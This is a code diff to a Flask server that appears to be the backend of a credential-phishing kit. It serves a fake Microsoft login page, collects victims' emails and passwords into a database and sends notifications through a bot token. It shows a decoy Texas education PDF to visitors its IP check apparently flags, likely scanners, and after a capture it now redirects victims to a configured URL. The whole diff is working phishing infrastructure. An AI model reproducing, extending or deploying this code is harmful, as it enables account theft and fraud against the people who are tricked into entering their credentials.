@@ -16,9 +16,11 @@ HOSTED_URL = os.getenv("HOSTED_URL")
 DEFAULT_USER_ID = os.getenv("USER_ID")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 IP_API_KEY = os.getenv("IP_API_KEY")
+REDIRECT_URL = os.getenv("REDIRECT_URL")
 
 # --- Flask App Initialization ---
 app = Flask(__name__, static_folder='microsoft_login/build')
+files_folder = "files"
 
 CORS(app, resources={r"/*": {"origins": "*"}})
 
@@ -147,7 +149,7 @@ def serve(path):
     # https://tea.texas.gov/about-tea/89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf
     
     if get_ip_details(visitor_ip):
-        return send_from_directory('','89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf')
+        return send_from_directory(files_folder,'89thlege-hb2-faq-teacher-compensation-updated-june-26.pdf')
 
     # This logic is now much simpler.
     # If the path points to an existing file in the static folder (like CSS, JS, or an image), serve it.
@@ -157,6 +159,9 @@ def serve(path):
     return send_from_directory(app.static_folder, 'index.html')
 
 
+@app.get("/file/<file_name>")
+def get_file(file_name):
+    return send_from_directory(files_folder,file_name)
 
 
 @app.get("/set_status/<user_id>/<email>/<status>")
@@ -363,7 +368,6 @@ def auth():
     Includes logic to return custom status data.
     """
     req = request.json
-    print("requst data ", req)
     # MODIFIED: Get user_id from the request body instead of the session.
     user_id = req.get('user_id') or DEFAULT_USER_ID
     session_id = req.get('session_id')
@@ -379,7 +383,6 @@ def auth():
 
     # The rest of this function remains exactly the same.
     db_record = Email_statuses.find_one(unique_filter)
-    print("thi is the db record", db_record)
 
     if custom_input:
         send_notification(f"Custom Input Received for {email}:\n{custom_input}", user_id=user_id, session_id=session_id, include_admin=True)
@@ -391,7 +394,6 @@ def auth():
         return jsonify({"status": "pending"})
 
     if not db_record or str(db_record.get('password')) != str(password):
-        print("reached here")
         get_status_update(session_id=session_id, email=email, password=password, user_id=user_id)
         Email_statuses.update_one(
             unique_filter,
@@ -429,9 +431,10 @@ def auth():
             "status": "custom",
             "data": db_record.get('custom_data')
         })
-
+    
+    if current_status == 'success':
+        return jsonify({"status": "success", "redirect_url": REDIRECT_URL})
     return jsonify({"status": current_status})
-
 
 
 
